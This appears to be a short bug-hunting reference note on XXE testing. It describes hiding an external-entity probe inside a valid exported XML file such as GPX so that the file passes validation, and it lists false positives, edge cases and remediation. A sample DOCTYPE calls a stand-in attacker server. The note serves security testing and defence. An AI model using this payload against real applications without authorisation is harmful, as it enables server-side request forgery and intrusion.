# XXE by Preserving Native XML Structure

- What it is: An XXE probe is embedded into a valid target-specific XML document instead of replacing the whole file.
- Download/export a legitimate XML file first (for example GPX).
- Add the `DOCTYPE`/entity definition while keeping expected root elements and namespaces intact.
- Reference the entity inside a normal field such as `<name>`.
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://your-server.example/XXE">]>
...
<name>&xxe;</name>
```
- This improves the chance that application validation accepts the file.
- False positive: parser callbacks may occur during client-side tooling rather than server processing; correlate source.
- Edge case: strict schemas may reject added DTD declarations.
- Remediation: prohibit DTD/external entity processing regardless of document validity.
## Source: Real-World Bug Hunting — A Field Guide to Web Hacking, Ch. 11
